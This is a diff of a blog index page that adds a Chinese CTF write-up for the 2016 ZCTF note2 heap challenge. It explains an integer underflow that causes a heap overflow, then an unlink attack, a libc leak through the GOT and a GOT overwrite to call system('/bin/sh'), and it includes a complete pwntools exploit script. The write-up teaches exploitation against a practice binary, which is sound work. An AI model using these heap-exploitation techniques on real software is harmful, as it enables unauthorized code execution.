@@ -172,7 +172,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-count">22</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -200,6 +200,145 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/04/07/2026-04-07-ZCTF-note2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/07/2026-04-07-ZCTF-note2/" class="post-title-link" itemprop="url">CTF题解：2016 ZCTF note2</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-04-07 10:00:00" itemprop="dateCreated datePublished" datetime="2026-04-07T10:00:00+08:00">2026-04-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-04-12 14:56:04" itemprop="dateModified" datetime="2026-04-12T14:56:04+08:00">2026-04-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h1><h2 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h2><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/2016_zctf_note2">2016 ZCTF note2</a></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input your name:</span><br><span class="line">whoamiuu</span><br><span class="line">Input your address:</span><br><span class="line">123456</span><br><span class="line">1.New note</span><br><span class="line">2.Show  note</span><br><span class="line">3.Edit note</span><br><span class="line">4.Delete note</span><br><span class="line">5.Quit</span><br><span class="line">option---&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>题目给出5个选项，存在申请、编辑、打印、删除函数。</p>
+<p>这道题提供非常规堆溢出漏洞利用思路。仅看反编译，程序自定义单字节读取的输入函数 myread，输入函数限制读取字节数，看似是一个安全输入函数，不过问题就出在其中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ulong <span class="title function_">myread</span><span class="params">(<span class="type">long</span> buf,<span class="type">long</span> size,<span class="type">char</span> end)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> local_19;</span><br><span class="line">  ulong i;</span><br><span class="line">  <span class="type">ssize_t</span> local_10;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size - <span class="number">1U</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">    local_10 = read(<span class="number">0</span>,&amp;local_19,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (local_10 &lt; <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (local_19 == end) <span class="keyword">break</span>;</span><br><span class="line">    *(<span class="type">char</span> *)(buf + i) = local_19;</span><br><span class="line">  &#125;</span><br><span class="line">  *(undefined1 *)(i + buf) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于 create 函数，需要输入堆块大小 size，之后 myread 函数会以这个大小限制读取字节数。仔细看 myread 的实现，其中单字节读入所在的 for 循环，i 是无符号数，问题是 size 是 long 类型（有符号），但 1U 是无符号整数，两者相减会得到无符号整数，如果 size &#x3D; 0，size - 1U &#x3D; 0 - 1 &#x3D; 0xFFFFFFFFFFFFFFFF（极大值）。而对于 create 函数，malloc(0) 根据 glibc 规定会分配 0x20 的最小堆块，于是我们就构造出了一个堆溢出。</p>
+<h2 id="二、调试"><a href="#二、调试" class="headerlink" title="二、调试"></a>二、调试</h2><p>根据反编译，堆的用户区指针存储在一个全局数组处，通过偏移量获取指针。对于申请的chunk，简称为chunk0，其在全局数组处存储的用户区指针简称为 global[0]。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>通过构造堆溢出触发 unlink 修改 global 指针，使其指向 got 表，然后通过 printf 泄露libc基址，之后 got 劫持触发system。</p>
+<p>此处 global 数组的特性使得构造的 unlink 堆块满足检查。</p>
+<h3 id="unlink-堆块"><a href="#unlink-堆块" class="headerlink" title="unlink 堆块"></a>unlink 堆块</h3><p>回顾一下 unlink 操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// unlink 宏的代码</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P, BK, FD) &#123; </span></span><br><span class="line">    FD = P-&gt;fd;              </span><br><span class="line">    BK = P-&gt;bk;              </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关键检查：确保双向链表的完整性</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">    FD-&gt;bk = BK;              <span class="comment">// 关键：写入操作</span></span><br><span class="line">    BK-&gt;fd = FD;              <span class="comment">// 关键：写入操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>FD是高地址堆块，BK是低地址堆块，注意fd在堆头偏移0x10处，bk在堆头偏移0x18处，P-&gt; fd 实际上指 P+0x10 处的值，P-&gt; bk 实际上指 P+0x18 处的值。也就是说，FD是fd指向的堆块，BK是bk指向的堆块。</p>
+<p>理解两个写入操作，FD-&gt;bk实际是 FD+0x18，BK-&gt;fd实际是 BK+0x10，两个写入操作就是把BK写入到 FD 的0x10偏移处，把FD写入到 BK 的0x18偏移处。</p>
+<p>同理，我们伪造 fd 和 bk，设置 fd &#x3D; target_addr  - 0x18，bk &#x3D; content，于是FD &#x3D; target_addr - 0x18，BK &#x3D; content，然后执行写入操作，target_addr &#x3D; content，content + 0x10 &#x3D; target_addr - 0x18。</p>
+<p>注意检查，要求 FD-&gt;bk &#x3D;&#x3D; P（target_addr &#x3D;&#x3D; P），BK-&gt;fd &#x3D;&#x3D; P（content + 0x10 &#x3D;&#x3D; P）。</p>
+<p>下面做漏洞利用：</p>
+<p>对于本题，我们需要申请三个堆块，其中第一个块 chunk0 作为被 unlink 的堆块，此处申请0x80 字节；第二个 chunk1 申请0字节，以构造堆溢出，需要注意根据 glibc 规定，最小堆块应有 0x20 字节大小，此处 chunk1 实际0x20大小；第三个 chunk3 作为被溢出覆盖的块，修改 size域标志位为 0，表示前一个块未使用。</p>
+<p>这里先给出现阶段 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/glibc/2.19/64/lib/libc.so.6&quot;</span>)</span><br><span class="line">elf  = ELF(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prevprocess</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Input your name:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;name&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Input your address:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;address&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;option---&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;length of the note content:(less than 128)&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;note content:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;option---&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id of the note:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>, newcontent</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;option---&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id of the note:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))  </span><br><span class="line">    io.recvuntil(<span class="string">b&quot;[1.overwrite/2.append]&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;TheNewContents:&quot;</span>)</span><br><span class="line">    io.sendline(newcontent)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;option---&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id of the note:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">global_array = <span class="number">0x602120</span></span><br><span class="line">prevprocess()</span><br><span class="line"></span><br><span class="line">fd = global_array - <span class="number">0x18</span>  <span class="comment"># target  = global_array</span></span><br><span class="line">bk = global_array - <span class="number">0x10</span>  <span class="comment"># content = global_array - 0x10</span></span><br><span class="line">fakechunk = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + p64(fd) + p64(bk) + <span class="string">b&quot;b&quot;</span>*<span class="number">64</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>, fakechunk) <span class="comment"># chunk0</span></span><br><span class="line">malloc(<span class="number">0</span>, <span class="string">b&quot;aaaa&quot;</span>)      <span class="comment"># chunk1</span></span><br><span class="line">malloc(<span class="number">0x80</span>, <span class="string">b&quot;aaaa&quot;</span>)   <span class="comment"># chunk2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">overflow = <span class="string">b&quot;a&quot;</span>*<span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">malloc(<span class="number">0</span>, overflow)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># trigger unlink</span></span><br></pre></td></tr></table></figure>
+
+<p>这里先解释两个输入内容 fakechunk 和 overflow：</p>
+<p>首先看 fakechunk ，输入p64(0) + p64(0x61) + p64(fd) + p64(bk)，伪造已释放的堆块，之后填充64字节，使得堆块大小和 size域 相同，而最后的0x60则是伪造的一个 prev_size域，为了满足unlink检查，表示前一个堆块0x60，且未被使用。</p>
+<p>overflow 是第二次申请0字节，实际依然在chunk1的位置分配0x20的堆块。这里填充16字节a填满chunk1，之后的 0xa0 和 0x90 分别溢出到chunk2的元数据，代表前一个堆块大小0xa0以及本堆块大小0x90。这里实际上是把 fakechunk 和 chunk1 视为一个堆块，本质上依然是对fakechunk进行unlink操作。</p>
+<p>接下来来看 unlink 操作：</p>
+<p>一般来说，对于这种使用 global 数组存储堆指针的题目，我们需要让 global 指针指向 global 数组中的地址，然后通过 edit 修改global指针。本题 fd 和 bk 的设置根据之前的讲述可以理解为<code>FD = global_array -0x18</code>、<code>BK = global_array - 0x10</code>，然后unlink两个写入操作</p>
+<ul>
+<li>(global_array -0x18) +0x18 &#x3D; global_array - 0x10</li>
+<li>(global_array - 0x10) + 0x10 &#x3D; global_array -0x18</li>
+</ul>
+<p>最终的赋值是第二步，也就是 global_array &#x3D; global_array -0x18（表示global[0]处存储global_array地址偏移0x18）。注意之前提到的检查 FD-&gt;bk &#x3D;&#x3D; BK-&gt;fd &#x3D;&#x3D; P，此处global_array (global[0]) 存储 chunk0 用户区指针，即指向 fakechunk 头，此时 fakechunk 作为P，伪造的 fd 和 bk 必须如上才能满足检查。</p>
+<h3 id="泄露-libc"><a href="#泄露-libc" class="headerlink" title="泄露 libc"></a>泄露 libc</h3><p>上述 unlink 操作过后，我们实现了 global[0] &#x3D;&#x3D; global_array - 0x18，也就是说我们对chunk0的操作实际上是在 global_array - 0x18 地址处的操作。于是只要填充到 global 并控制其中的一个指针，使其为某函数的 got 表地址，通过 Show note 选项就可以泄露 libc 。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">atoi_got = elf.got[<span class="string">&quot;atoi&quot;</span>]</span><br><span class="line">leaklibc = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(atoi_got) <span class="comment"># 填充到 global[0]，写入atoi的got地址</span></span><br><span class="line">edit(<span class="number">0</span>, leaklibc)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Content is &quot;</span>)</span><br><span class="line">atoi_addr = io.recvline().split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">atoi_addr = u64(atoi_addr) <span class="comment"># leak libc</span></span><br><span class="line">log.success(<span class="string">f&quot;atio address: <span class="subst">&#123;<span class="built_in">hex</span>(atoi_addr)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>之后计算 libc 基址和 system 地址，不再赘述。</p>
+<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><p>上一步已将 global[0] 覆写为 atoi@got，于是再次 edit chunk0，覆写got表中的 atoi 为 system 地址，于是之后调用 atoi 函数时实际调用 system，并且 atoi 和 system 均传入字符串指针，调用 atoi 函数时输入字符串 “&#x2F;bin&#x2F;sh” 即可调用 system(&#x2F;bin&#x2F;sh)。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hajack_got = p64(system)</span><br><span class="line">edit(<span class="number">0</span>, hajack_got)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;option---&gt;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>完整exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/glibc/2.19/64/lib/libc.so.6&quot;</span>)</span><br><span class="line">elf  = ELF(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prevprocess</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Input your name:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;name&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Input your address:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;address&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;option---&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;length of the note content:(less than 128)&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;note content:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;option---&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id of the note:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>, newcontent</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;option---&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id of the note:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))  </span><br><span class="line">    io.recvuntil(<span class="string">b&quot;[1.overwrite/2.append]&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;TheNewContents:&quot;</span>)</span><br><span class="line">    io.sendline(newcontent)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;option---&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id of the note:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">global_array = <span class="number">0x602120</span></span><br><span class="line">prevprocess()</span><br><span class="line"></span><br><span class="line">fd = global_array - <span class="number">0x18</span>  <span class="comment"># target  = global_array</span></span><br><span class="line">bk = global_array - <span class="number">0x10</span>  <span class="comment"># content = global_array - 0x10</span></span><br><span class="line">fakechunk = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + p64(fd) + p64(bk) + <span class="string">b&quot;b&quot;</span>*<span class="number">64</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>, fakechunk) <span class="comment"># chunk0</span></span><br><span class="line">malloc(<span class="number">0</span>, <span class="string">b&quot;aaaa&quot;</span>)      <span class="comment"># chunk1</span></span><br><span class="line">malloc(<span class="number">0x80</span>, <span class="string">b&quot;aaaa&quot;</span>)   <span class="comment"># chunk2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">overflow = <span class="string">b&quot;a&quot;</span>*<span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">malloc(<span class="number">0</span>, overflow)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># trigger unlink</span></span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&quot;atoi&quot;</span>]</span><br><span class="line">leaklibc = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>, leaklibc)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Content is &quot;</span>)</span><br><span class="line">atoi_addr = io.recvline().split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">atoi_addr = u64(atoi_addr)</span><br><span class="line">log.success(<span class="string">f&quot;atio address: <span class="subst">&#123;<span class="built_in">hex</span>(atoi_addr)&#125;</span>&quot;</span>)</span><br><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;System address: <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">hajack_got = p64(system)</span><br><span class="line">edit(<span class="number">0</span>, hajack_got)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;option---&gt;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1430,141 +1569,6 @@
 <p>![image-20260131230709503](&#x2F;images&#x2F;VNCTF 2026&#x2F;1-31-eat-some-AI&#x2F;flag.png)</p>
 <p>查到了flag路径，cat &#x2F;flag即可</p>
 <p><img src="/images/VNCTF2026/1-31-eat-some-AI/flag2.png" alt="image-20260131231238415"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/01/30/2026-01-30-ret2VDSO%20%E6%8A%80%E6%9C%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Whoamiuu's Blogs">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Whoamiuu's Blogs">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/01/30/2026-01-30-ret2VDSO%20%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">学习笔记：ret2VDSO技术</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-01-30 10:00:00" itemprop="dateCreated datePublished" datetime="2026-01-30T10:00:00+08:00">2026-01-30</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-02-03 21:47:10" itemprop="dateModified" datetime="2026-02-03T21:47:10+08:00">2026-02-03</time>
-    </span>
-    <span class="post-meta-item">
